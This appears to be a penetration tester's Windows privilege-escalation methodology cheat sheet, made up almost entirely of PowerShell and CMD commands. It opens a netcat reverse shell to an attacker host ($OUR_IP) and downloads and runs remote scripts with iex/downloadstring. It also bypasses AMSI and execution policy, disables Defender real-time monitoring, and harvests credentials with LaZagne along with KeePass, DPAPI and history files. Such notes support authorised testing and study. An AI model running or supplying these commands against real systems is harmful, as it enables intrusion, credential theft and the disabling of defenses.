# Methodology

**Note:** Commands that have equivalents for both CMD and PowerShell will be separated with `---`, with the CMD command first, followed by their PowerShell equivalents.

## Prep Work

```powershell
# Establish a working environment to drop files into
C:\ProgramData
C:\Users\Public
C:\Temp

# Upgrade the current shell
iwr -uri $OUR_IP/nc.exe -outfile nc.exe
rlwrap -crA nc -lvnp 9002 # On kali box
.\nc.exe $OUR_IP 9002 -e cmd.exe
powershell -ep bypass
```

## Enumeration

```powershell
# Bypass AMSI if necessary (evil-winrm)
Bypass-4MSI

# Import powershell script to current session
iex(new-object net.webclient).downloadstring('http://$OUR_IP:$PORT/$SCRIPT.ps1') # Not required if using evil-winrm

# Run automated tools if possible
Invoke-PrivescCheck
Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML
Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML
Invoke-BloodHound -c All
.\LaZagne.exe all -v

# Check privileges
whoami /all
tree C:\Users /a /f

# Check local users/groups
net user
net user $USER
net localgroup

Get-LocalUser
Get-LocalGroup

# Check local group memberships
net localgroup $GROUP

Get-LocalGroupMember $GROUP

# Gather system information
systeminfo # Check "OS Name", "OS Version", "System Type"

# Gather network information
netstat -ano | findstr LIST # Look for new available ports
Get-Process -Id $PID        # Check the process associated with a PID
ipconfig /all               # Check "Physical Address", "DHCP Enabled", "IPv4 Address", "Default Gateway", and "DNS Servers"
route print                 # Look for attack vectors to other systems or networks

# Check installed applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName,DisplayVersion
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName,DisplayVersion

# Check running processes
Get-Process | Sort-Object Id
Get-Process | Select-Object Id, ProcessName, Path | Sort-Object Id

# Enumerate user directories
gci -Path C:\Users -Include ConsoleHost_history.txt -File -Force -Recurse -ErrorAction SilentlyContinue
gci -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# Check file permissions
icacls $TARGET /c

# Search for sensitive files
gci -Path C:\xampp -Include my.ini -File -Recurse -ErrorAction SilentlyContinue
gci -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
gci -Path C:\inetpub -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
gci -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue    # KeePass database files
gci -Path C:\ -Include .git -Directory -Recurse -Force -ErrorAction SilentlyContinue
gci -Path C:\ -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf -File -Recurse -ErrorAction SilentlyContinue

# Check command history
Get-History
dir C:\Users\$USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

# Check DPAPI
gci C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SID -Force
dir C:\Users\$USER\AppData\Local\Microsoft\Protect\$SID -Force

# Check services
Get-CimInstance -ClassName win32_service | Select ProcessId, Name, State, PathName | Sort-Object ProcessId | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Sort-Object ProcessId
Get-CimInstance -ClassName win32_service | Where-Object {$_.Name -like '$SERVICE_NAME'}

# Manage services
Restart-Service $SERVICE_NAME
net stop $SERVICE_NAME --- Stop-Service $SERVICE_NAME
net start $SERVICE_NAME --- Start-Service $SERVICE_NAME

# Check path environment variable
$env:path

# Check scheduled tasks
schtasks /query /fo LIST /v > tasks.txt
dos2unix tasks.txt     # On kali
less tasks.txt         # On kali, search for tasks owned by privileged accounts. Check "TaskName", "Next Run Time", "Author", "Task To Run", and "Run As User"
schtasks /query /fo LIST /v /TN "$TASK"
cat tasks.txt | grep \.exe | grep -iv system32

# Check dotnet version
gci 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version,Release -ErrorAction 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select PSChildName, Version, Release

# Check Defender
Get-MpComputerStatus
Get-MpComputerStatus | Select RealTimeProtectionEnabled
Get-MpPreference | Select-Object -Property ExclusionPath
Set-MpPreference -DisableRealTimeMonitoring $true

# Check for additional sessions
qwinsta
Invoke-RunasCs x x qwinsta -l 9
```

### Additional Tools

```powershell
# RunasCs
Invoke-RunasCs $USER '$PASSWD' '$PASSWD' -t 0
Invoke-RunasCs $USER '$PASSWD' '$PASSWD' -t 0 --bypass-uac --logon-type 8

# SharpUp
.\SharpUp.exe audit

# LaZagne.exe
.\LaZagne.exe all -v
```

## Tools

1. [PrivescCheck](https://github.com/itm4n/PrivescCheck)
2. [SharpHound.ps1](https://github.com/SpecterOps/BloodHound-Legacy)
3. [LaZagne](https://github.com/AlessandroZ/LaZagne) - **USE 2.4.5 RELEASE OR YOU WILL HAVE DEPENDENCY ISSUES**
4. [SharpUp](https://github.com/GhostPack/SharpUp)
5. [winPEAS](https://github.com/carlospolop/PEASS-ng/releases/)
6. [Seatbelt](Tools/Seatbelt.md)

**Honorable Mention**

7. [PowerUp](Tools/PowerUp.md)

## Resources

- [Privileged Groups](https://github.com/ivanversluis/pentest-hacktricks/blob/master/windows/active-directory-methodology/privileged-accounts-and-token-privileges.md)
